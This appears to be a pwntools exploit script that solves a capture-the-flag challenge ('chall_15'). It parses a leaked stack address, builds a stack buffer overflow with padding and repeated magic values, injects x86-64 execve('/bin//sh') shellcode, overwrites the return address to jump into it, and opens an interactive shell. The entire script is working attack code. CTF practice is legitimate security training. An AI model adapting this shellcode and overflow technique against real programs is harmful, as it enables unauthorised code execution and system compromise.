from pwn import *

def main():
	binary = context.binary = ELF("./chall_15")
	p = process("./chall_15")
	p.sendline()
	addr = int(p.recv().decode().split("0x")[1].split("\n")[0], 16)
	payload = ((10 * "A").encode())+ p32(16435934)
	payload += ((16 - (addr + len(payload)) & 0xf) * "A").encode()
	plen = len(payload)
	payload += b'\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05'
	payload += ((78 - len(payload) - 12) * "A").encode()
	payload += p32(16435934)
	payload += ((78 - len(payload)) * "A").encode()
	payload += p64(addr + plen)
	p.sendline(payload)
	p.interactive()
main()
